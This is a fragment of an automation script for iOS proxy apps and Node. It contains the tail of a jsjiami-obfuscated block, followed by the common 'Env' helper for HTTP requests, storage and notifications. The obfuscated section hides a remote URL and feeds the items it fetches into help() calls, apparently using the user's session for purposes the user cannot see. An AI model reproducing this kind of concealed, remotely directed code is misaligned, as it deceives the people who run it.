_0x7f3ed3=~-0x4>>0x1+0xff%0x0;if(_0x223955['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x7f3ed3){_0xbe1687(_0x223955);}};if(!_0x31423f()){if(!_0x25bf1d()){_0xbe1687('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0xbe1687('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0xbe1687('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x5b056e();var _0x58dc5f={'KXkde':function(_0x45d715,_0x33c9a6){return _0x45d715!==_0x33c9a6;},'NAFRk':function(_0x4ba4eb,_0x42928c){return _0x4ba4eb<_0x42928c;},'OKVNY':function(_0x53690f,_0x2f966c){return _0x53690f(_0x2f966c);},'DlyRc':_0x5a74('27','tnxM'),'PSjhA':_0x5a74('28','AOgB')};new Promise(_0x3e44d7=>{$[_0x5a74('29','k3&s')]({'url':_0x58dc5f[_0x5a74('2a','EZsI')],'headers':{'User-Agent':_0x58dc5f[_0x5a74('2b','Rn4U')]}},async(_0x10dec7,_0x299e74,_0x4fefbd)=>{if(_0x4fefbd){$[_0x5a74('2c',')gtU')]=JSON[_0x5a74('2d','evCp')](_0x4fefbd);console[_0x5a74('2e','zNBY')](_0x4fefbd);if(_0x58dc5f[_0x5a74('2f','hN8z')]($[_0x5a74('30','#$1#')][_0x5a74('31','2!#B')][_0x5a74('32','Rn4U')],0x0)){for(let _0x34272f=0x0;_0x58dc5f[_0x5a74('33','Ulof')](_0x34272f,$[_0x5a74('34','fKb8')][_0x5a74('35','I0!n')][_0x5a74('36','&Tpp')]);_0x34272f++){let _0x5d3375=$[_0x5a74('37','w8UA')][_0x5a74('38','F78z')][_0x34272f];await $[_0x5a74('39','%z0z')](0x2bc);_0x58dc5f[_0x5a74('3a','A^@&')](help,_0x5d3375);}}}});});}};_0xodZ='jsjiami.com.v6';
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
